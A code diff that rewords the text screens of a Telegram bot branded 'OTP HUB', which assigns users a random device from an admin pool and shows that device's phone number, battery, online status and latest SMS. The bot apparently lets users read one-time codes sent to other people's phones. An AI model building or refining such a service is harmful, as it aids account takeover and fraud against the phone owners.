@@ -42,8 +42,8 @@ export function premiumizeKeyboard(markup: unknown): unknown {
 
 export const homeKeyboard = (showAdmin = false): InlineKeyboardMarkup => ({
   inline_keyboard: [
-    [{ text: "🆕 New Device", callback_data: "new_device" }, { text: "📘 How to Use", callback_data: "how_to_use" }],
-    [{ text: "🔄 Refresh", callback_data: "home" }, { text: "🔐 Access / Refer", callback_data: "free_panels" }],
+    [{ text: "⚡ Generate Device", callback_data: "new_device" }, { text: "📘 How It Works", callback_data: "how_to_use" }],
+    [{ text: "↻ Refresh Dashboard", callback_data: "home" }, { text: "🔐 Access & Referrals", callback_data: "free_panels" }],
     ...(showAdmin ? [[{ text: "👑 Admin Panel", callback_data: "admin" }]] : [])
   ]
 });
@@ -55,17 +55,19 @@ export const navKeyboard = (backData = "back"): InlineKeyboardMarkup => ({
 export function homeText(summary: { connections: number; devices: DeviceSummary }, firebaseLimit = 10) {
   return [
     "━━━━━━━━━━━━━━━━━━━━",
-    "🔥 DEVICE MANAGER",
+    "🔥 OTP HUB  •  DEVICE CENTER",
     "━━━━━━━━━━━━━━━━━━━━",
     "",
-    "Your secure device access center.",
+    "Your private, secure device access center.",
     "",
     "📊 ACCOUNT OVERVIEW",
-    `🔥 Device sources: ${summary.connections}/${firebaseLimit}`,
-    `📱 Available devices: ${summary.devices.total}`,
-    `🟢 Online: ${summary.devices.online}  ·  🔴 Offline: ${summary.devices.offline}`,
+    `🔥 Active sources     ${summary.connections}/${firebaseLimit}`,
+    `📱 Available devices  ${summary.devices.total}`,
+    `🟢 Online             ${summary.devices.online}`,
+    `🔴 Offline            ${summary.devices.offline}`,
     "",
-    "Choose an action below. A device is selected from the admin pool when you tap New Device.",
+    "Choose an action below.",
+    "Generate Device selects a random device from the live admin pool.",
     "",
     "━━━━━━━━━━━━━━━━━━━━"
   ].join("\n");
@@ -148,19 +150,19 @@ export function accessGateKeyboard(
 export function deviceDetailText(device: Device, sourceName: string): string {
   return [
     "━━━━━━━━━━━━━━━━━━━━",
-    "📱 DEVICE SELECTED",
+    "⚡ DEVICE READY",
     "━━━━━━━━━━━━━━━━━━━━",
     "",
-    `🔥 Source: ${sourceName}`,
-    `${device.status === "online" ? "🟢" : "🔴"} Status: ${device.status === "online" ? "Online" : "Offline"}`,
+    `🔥 Source      ${sourceName}`,
+    `${device.status === "online" ? "🟢" : "🔴"} Status       ${device.status === "online" ? "Online" : "Offline"}`,
     "",
-    `🆔 Device ID: ${device.deviceId}`,
-    `📞 Number: ${device.number ?? "Number unavailable"}`,
-    `🔋 Battery: ${device.battery !== undefined ? `${device.battery}%` : "Battery unavailable"}`,
-    `🕒 Last Seen: ${device.lastSeen ?? "Unavailable"}`,
+    `🆔 Device ID   ${device.deviceId}`,
+    `📞 Number      ${device.number ?? "Unavailable"}`,
+    `🔋 Battery     ${device.battery !== undefined ? `${device.battery}%` : "Unavailable"}`,
+    `🕒 Last seen   ${device.lastSeen ?? "Unavailable"}`,
     "",
-    "Is device ke messages tabhi milenge jab tak yeh device selected hai.",
-    "Back ya Change Device karne par purane device ke messages turant band ho jayenge.",
+    "This device is selected for live message delivery.",
+    "Change Device stops the previous device immediately.",
     "━━━━━━━━━━━━━━━━━━━━"
   ].join("\n");
 }
@@ -181,7 +183,7 @@ export function lastSmsText(
 ): string {
   const lines = [
     "━━━━━━━━━━━━━━━━━━━━",
-    "📩 LAST 5 SMS",
+    "📩 LATEST DEVICE MESSAGES",
     "━━━━━━━━━━━━━━━━━━━━",
     "",
     `📱 ${device.deviceId}`,
@@ -195,7 +197,7 @@ export function lastSmsText(
       lines.push(`${index + 1}. ${event.timestamp ?? "Time unavailable"}`, event.message, "");
     });
   }
-  lines.push("Only the currently selected device is shown.", "━━━━━━━━━━━━━━━━━━━━");
+  lines.push("Only messages from the selected device are shown.", "━━━━━━━━━━━━━━━━━━━━");
   return lines.join("\n").slice(0, 3900);
 }
 
